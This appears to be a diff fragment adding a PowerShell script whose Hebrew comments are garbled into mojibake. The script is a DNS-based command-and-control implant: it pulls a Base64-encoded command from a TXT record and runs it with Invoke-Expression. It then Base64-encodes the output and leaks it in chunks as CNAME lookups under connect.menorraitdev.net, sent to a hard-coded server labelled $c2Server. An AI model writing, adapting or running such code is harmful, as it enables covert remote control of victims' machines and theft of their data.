@@ -1,0 +1,41 @@
+# ×—×™×œ×•×¥ ×”×¤×§×•×“×” ×ž×¨×©×•×ž×ª ×”-TXT
+if ($output -match 'text\s*=\s*"(.*?)"') {
+    $result = $matches[1]
+}
+
+Write-Output "Extracted TXT record: $result"
+
+# ×©×œ×‘ 2: ×¤×¢× ×•×— ×”×¤×§×•×“×” ×ž-Base64
+try {
+    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($result))
+    Write-Output "Decoded command: $command"
+} catch {
+    Write-Output "Failed to decode command from Base64"
+    return
+}
+
+# ×©×œ×‘ 3: ×”×¨×¦×ª ×”×¤×§×•×“×”
+$output = Invoke-Expression $command
+Write-Output "Command output: $output"
+
+# ×©×œ×‘ 4: ×§×™×“×•×“ ×”×¤×œ×˜ ×œ-Base64
+try {
+    $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
+    Write-Output "Encoded output: $encodedOutput"
+} catch {
+    Write-Output "Failed to encode output to Base64"
+    return
+}
+
+# ×©×œ×‘ 5: ×¤×™×¦×•×œ ×”×¤×œ×˜ ×•×©×œ×™×—×ª×• ×›-CNAME
+$domain = "connect.menorraitdev.net"
+$c2Server = "159.223.6.139"
+$chunks = ($encodedOutput -split '(.{63})' | ? { $_ -ne "" })
+$counter = 1
+
+foreach ($chunk in $chunks) {
+    $subdomain = "$counter.$chunk.$domain"
+    Start-Process nslookup -ArgumentList "-type=CNAME -port=5300 $subdomain $c2Server"
+    Start-Sleep -Milliseconds 200
+    $counter++
+}
